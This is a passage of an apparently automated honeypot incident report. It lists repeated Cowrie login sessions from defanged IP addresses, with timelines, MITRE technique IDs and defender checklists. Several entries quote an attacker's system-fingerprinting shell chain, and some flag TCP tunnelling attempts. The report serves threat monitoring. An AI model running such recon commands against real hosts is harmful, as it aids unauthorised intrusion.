-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:30` | `cowrie.session.connect` |
-| `2026-08-22 14:08:30` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:31` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:31` | `cowrie.login.success` |
-| `2026-08-22 14:08:32` | `cowrie.session.params` |
-| `2026-08-22 14:08:32` | `cowrie.log.closed` |
-| `2026-08-22 14:08:32` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8f330e5d38ba
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:32` | `cowrie.session.connect` |
-| `2026-08-22 14:08:32` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:33` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:33` | `cowrie.login.success` |
-| `2026-08-22 14:08:33` | `cowrie.session.params` |
-| `2026-08-22 14:08:33` | `cowrie.log.closed` |
-| `2026-08-22 14:08:33` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-11aaf02d3f5c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:33` | `cowrie.session.connect` |
-| `2026-08-22 14:08:34` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:35` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:35` | `cowrie.login.success` |
-| `2026-08-22 14:08:35` | `cowrie.session.params` |
-| `2026-08-22 14:08:35` | `cowrie.log.closed` |
-| `2026-08-22 14:08:35` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-974897c3ecef
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:35` | `cowrie.session.connect` |
-| `2026-08-22 14:08:36` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:37` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:37` | `cowrie.login.success` |
-| `2026-08-22 14:08:37` | `cowrie.session.params` |
-| `2026-08-22 14:08:37` | `cowrie.log.closed` |
-| `2026-08-22 14:08:37` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e0631d47cf9a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:37` | `cowrie.session.connect` |
-| `2026-08-22 14:08:38` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:38` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:38` | `cowrie.login.success` |
-| `2026-08-22 14:08:39` | `cowrie.session.params` |
-| `2026-08-22 14:08:39` | `cowrie.log.closed` |
-| `2026-08-22 14:08:39` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1d44958c14cd
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:39` | `cowrie.session.connect` |
-| `2026-08-22 14:08:40` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:40` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:40` | `cowrie.login.success` |
-| `2026-08-22 14:08:41` | `cowrie.session.params` |
-| `2026-08-22 14:08:41` | `cowrie.log.closed` |
-| `2026-08-22 14:08:41` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-af18ba1a1fb4
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:41` | `cowrie.session.connect` |
-| `2026-08-22 14:08:42` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:42` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:42` | `cowrie.login.success` |
-| `2026-08-22 14:08:43` | `cowrie.session.params` |
-| `2026-08-22 14:08:43` | `cowrie.log.closed` |
-| `2026-08-22 14:08:43` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-5624f580657b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:43` | `cowrie.session.connect` |
-| `2026-08-22 14:08:43` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:44` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:44` | `cowrie.login.success` |
-| `2026-08-22 14:08:45` | `cowrie.session.params` |
-| `2026-08-22 14:08:45` | `cowrie.log.closed` |
-| `2026-08-22 14:08:45` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8bd2021b00d5
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:45` | `cowrie.session.connect` |
-| `2026-08-22 14:08:45` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:46` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:46` | `cowrie.login.success` |
-| `2026-08-22 14:08:46` | `cowrie.session.params` |
-| `2026-08-22 14:08:47` | `cowrie.log.closed` |
-| `2026-08-22 14:08:47` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-99cd1e509bde
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:47` | `cowrie.session.connect` |
-| `2026-08-22 14:08:47` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:48` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:48` | `cowrie.login.success` |
-| `2026-08-22 14:08:48` | `cowrie.session.params` |
-| `2026-08-22 14:08:48` | `cowrie.log.closed` |
-| `2026-08-22 14:08:49` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-610511a72443
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:49` | `cowrie.session.connect` |
-| `2026-08-22 14:08:49` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:50` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:50` | `cowrie.login.success` |
-| `2026-08-22 14:08:50` | `cowrie.session.params` |
-| `2026-08-22 14:08:50` | `cowrie.log.closed` |
-| `2026-08-22 14:08:50` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-142a3902dcc1
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:09 |
-| **Last Seen** | 2026-08-22 14:09 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:09:13` | `cowrie.session.connect` |
-| `2026-08-22 14:09:13` | `cowrie.client.version` |
-| `2026-08-22 14:09:14` | `cowrie.client.kex` |
-| `2026-08-22 14:09:14` | `cowrie.login.success` |
-| `2026-08-22 14:09:15` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:09:15` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:09:15` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:09:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3d74b1c366eb
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:09 |
-| **Last Seen** | 2026-08-22 14:09 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:09:18` | `cowrie.session.connect` |
-| `2026-08-22 14:09:18` | `cowrie.client.version` |
-| `2026-08-22 14:09:18` | `cowrie.client.kex` |
-| `2026-08-22 14:09:19` | `cowrie.login.success` |
-| `2026-08-22 14:09:19` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:09:19` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:09:19` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:09:20` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-eb692c4363ee
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:09 |
-| **Last Seen** | 2026-08-22 14:09 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:09:56` | `cowrie.session.connect` |
-| `2026-08-22 14:09:56` | `cowrie.client.version` |
-| `2026-08-22 14:09:56` | `cowrie.client.kex` |
-| `2026-08-22 14:09:56` | `cowrie.login.success` |
-| `2026-08-22 14:09:57` | `cowrie.session.params` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.success` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.command.input` |
-| `2026-08-22 14:09:57` | `cowrie.log.closed` |
-| `2026-08-22 14:09:57` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-554122af235e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:11 |
-| **Last Seen** | 2026-08-22 14:11 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:11:40` | `cowrie.session.connect` |
-| `2026-08-22 14:11:40` | `cowrie.client.version` |
-| `2026-08-22 14:11:40` | `cowrie.client.kex` |
-| `2026-08-22 14:11:42` | `cowrie.login.success` |
-| `2026-08-22 14:11:43` | `cowrie.session.params` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.success` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:43` | `cowrie.command.input` |
-| `2026-08-22 14:11:44` | `cowrie.log.closed` |
-| `2026-08-22 14:11:44` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-918dcc9961f2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:12 |
-| **Last Seen** | 2026-08-22 14:12 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:12:55` | `cowrie.session.connect` |
-| `2026-08-22 14:12:56` | `cowrie.client.version` |
-| `2026-08-22 14:12:56` | `cowrie.client.kex` |
-| `2026-08-22 14:12:57` | `cowrie.login.success` |
-| `2026-08-22 14:12:58` | `cowrie.session.params` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.success` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:58` | `cowrie.command.input` |
-| `2026-08-22 14:12:59` | `cowrie.log.closed` |
-| `2026-08-22 14:12:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-73506e88793b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:14 |
-| **Last Seen** | 2026-08-22 14:14 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:14:13` | `cowrie.session.connect` |
-| `2026-08-22 14:14:14` | `cowrie.client.version` |
-| `2026-08-22 14:14:14` | `cowrie.client.kex` |
-| `2026-08-22 14:14:15` | `cowrie.login.success` |
-| `2026-08-22 14:14:16` | `cowrie.session.params` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.success` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:16` | `cowrie.command.input` |
-| `2026-08-22 14:14:17` | `cowrie.log.closed` |
-| `2026-08-22 14:14:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-06200c77fdfb
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:15 |
-| **Last Seen** | 2026-08-22 14:15 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:15:26` | `cowrie.session.connect` |
-| `2026-08-22 14:15:27` | `cowrie.client.version` |
-| `2026-08-22 14:15:27` | `cowrie.client.kex` |
-| `2026-08-22 14:15:28` | `cowrie.login.success` |
-| `2026-08-22 14:15:29` | `cowrie.session.params` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.success` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.command.input` |
-| `2026-08-22 14:15:29` | `cowrie.log.closed` |
-| `2026-08-22 14:15:29` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b692300fd9e4
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:16 |
-| **Last Seen** | 2026-08-22 14:16 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:16:38` | `cowrie.session.connect` |
-| `2026-08-22 14:16:38` | `cowrie.client.version` |
-| `2026-08-22 14:16:38` | `cowrie.client.kex` |
-| `2026-08-22 14:16:39` | `cowrie.login.success` |
-| `2026-08-22 14:16:40` | `cowrie.session.params` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.success` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:40` | `cowrie.command.input` |
-| `2026-08-22 14:16:41` | `cowrie.log.closed` |
-| `2026-08-22 14:16:41` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-0ac07dd0862a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:17 |
